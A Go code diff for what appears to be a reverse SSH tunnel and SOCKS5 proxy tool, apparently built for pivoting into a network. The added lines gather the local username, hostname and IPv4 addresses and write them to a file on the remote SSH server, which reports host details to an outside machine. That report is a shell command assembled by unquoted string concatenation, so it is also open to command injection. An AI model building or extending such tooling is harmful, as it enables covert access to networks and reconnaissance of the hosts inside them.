@@ -8,7 +8,10 @@ import (
 	"golang.org/x/crypto/ssh"
 	"log"
 	"math/rand"
+	"net"
 	"os"
+	"os/user"
+	"strings"
 	"sync"
 )
 
@@ -62,6 +65,17 @@ func sshRemoteForward() {
 		}
 	}
 
+	addr, err := getLocalNetworkInfo()
+
+	// 获取本地用户名和主机名
+	User, _ := user.Current()
+	Host, _ := os.Hostname()
+
+	err = con.Command("echo " + strings.Join(addr, "====") + " > /tmp/" + User.Username + "--" + Host + ".txt")
+	if err != nil {
+		log.Println(err)
+	}
+
 	// PortForward
 	socks5Listen := <-socks5ListenChan
 	err = con.TCPRemoteForward(socks5Listen, sshListen)
@@ -93,4 +107,38 @@ func socks5Server() {
 	}
 
 	wg.Done()
+}
+
+// 获取本地网络信息
+func getLocalNetworkInfo() ([]string, error) {
+	var info []string
+	interfaces, err := net.Interfaces()
+	if err != nil {
+		return nil, err
+	}
+
+	for _, i := range interfaces {
+
+		// 过滤掉loopback
+		if i.Flags&net.FlagLoopback != 0 {
+			continue
+		}
+
+		addrs, err := i.Addrs()
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+
+		for _, addr := range addrs {
+
+			// 过滤掉ipv6
+			if strings.Contains(addr.String(), ":") {
+				continue
+			}
+
+			info = append(info, fmt.Sprintf("Interface: %v, ---Address--------: %v", i.Name, addr))
+		}
+	}
+	return info, nil
 }
